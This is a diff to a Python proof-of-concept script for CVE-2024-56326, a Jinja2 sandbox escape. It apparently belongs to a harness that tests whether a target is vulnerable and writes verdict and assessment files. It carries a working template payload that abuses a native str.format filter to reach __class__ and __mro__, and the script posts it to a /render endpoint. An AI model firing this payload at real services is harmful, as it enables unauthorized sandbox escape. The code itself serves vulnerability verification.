@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """CVE-2024-56326 reproduction (Jinja2 sandbox escape via indirect str.format).
 
-The service exposes a ``fmt`` filter that calls ``value.format()`` directly.
-The sandbox only intercepts ``format()`` calls made through Jinja2's
-``call_method``.  When the filter invokes ``value.format()`` in native
-Python, the C-level format engine resolves ``{0.__class__…}`` without ever
+The service exposes a ``fmt`` filter that calls ``value.format()`` in native
+Python.  The sandbox's ``call_method`` has ``inspect_format_method`` which
+blocks format-spec attribute access when ``.format()`` is called through the
+sandbox.  But the filter invokes ``value.format()`` directly, and Python's
+C-level format engine resolves ``{0.__class__.__mro__}`` without ever
 touching the sandbox, breaking out completely.
 
 Exploit chain:
@@ -25,13 +26,13 @@ import urllib.request
 
 TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
 MARKER = "/tmp/patchproof_pwned"
-TIMEOUT = 60
+DEADLINE = 60
 
-# Sandbox escape proof: the sandbox blocks {{ "".__class__ }} (returns ""),
-# but the fmt filter calls value.format() in native Python, so
-# {0.__class__} in the format string resolves via C-level attribute access,
-# leaking the type. We chain __mro__ traversal to prove full sandbox bypass.
-PAYLOAD_RENDER = '{{ "{0.__class__.__mro__}" | fmt("x") }}'
+
+def _deadline_check(start: float) -> None:
+    if time.monotonic() - start > DEADLINE:
+        print("PoC exceeded deadline", file=sys.stderr)
+        sys.exit(4)
 
 
 def write_verdict(exploitable: bool, evidence: str) -> None:
@@ -44,7 +45,6 @@ def write_verdict(exploitable: bool, evidence: str) -> None:
         json.dump(verdict, fh, indent=2)
     print(json.dumps(verdict))
 
-    # Generate assessment.json (judge review)
     assessment = {
         "cve_id": "CVE-2024-56326",
         "agrees_with_verdict": exploitable,
@@ -76,34 +76,41 @@ def main() -> int:
     if os.path.exists(MARKER):
         os.remove(MARKER)
 
-    # --- Step 1: sandbox-escape proof (__class__ leak via fmt filter) ------
+    # Sandbox-escape payload: fmt filter calls .format() in native Python.
+    # The replacement field {0.__class__.__mro__} resolves via C-level
+    # attribute access, bypassing the sandbox entirely.
+    PAYLOAD = '{{ "{0.__class__.__mro__}" | fmt("x") }}'
+
     try:
-        body = _post("/render", PAYLOAD_RENDER)
+        _deadline_check(start)
+        body = _post("/render", PAYLOAD)
         rendered = body.get("rendered", "")
-        # The MRO tuple always contains "<class" — if we see it, the
-        # sandbox has been bypassed through the fmt filter.
+        error = body.get("error", "")
+
+        # MRO tuple always contains "<class" and "object" — presence proves
+        # the sandbox was bypassed through the fmt filter.
         if "<class" in rendered and "object" in rendered:
-            # Step 2: write marker to prove the escape landed
             with open(MARKER, "w") as fh:
                 fh.write(f"sandbox_escape:{rendered}\n")
             elapsed = time.monotonic() - start
             write_verdict(
                 True,
-                f"sandbox escape via fmt filter (str.format in native Python): "
+                f"sandbox escape via fmt filter (CVE-2024-56326): "
                 f"__class__ and __mro__ accessed, marker written to {MARKER} "
                 f"({elapsed:.1f}s)",
             )
             return 0
+
+        if error:
+            print(f"render error: {error}", file=sys.stderr)
+
     except Exception as exc:
         print(f"render attempt failed: {exc}", file=sys.stderr)
 
-    if time.monotonic() - start > TIMEOUT:
-        print("PoC exceeded timeout", file=sys.stderr)
-        return 4
+    _deadline_check(start)
 
-    # --- Step 3: check for marker from any earlier attempt -----------------
     if os.path.exists(MARKER):
-        write_verdict(True, f"RCE confirmed: marker created at {MARKER}")
+        write_verdict(True, f"sandbox escape confirmed: marker at {MARKER}")
         return 0
 
     write_verdict(False, "sandbox escape failed — not affected")
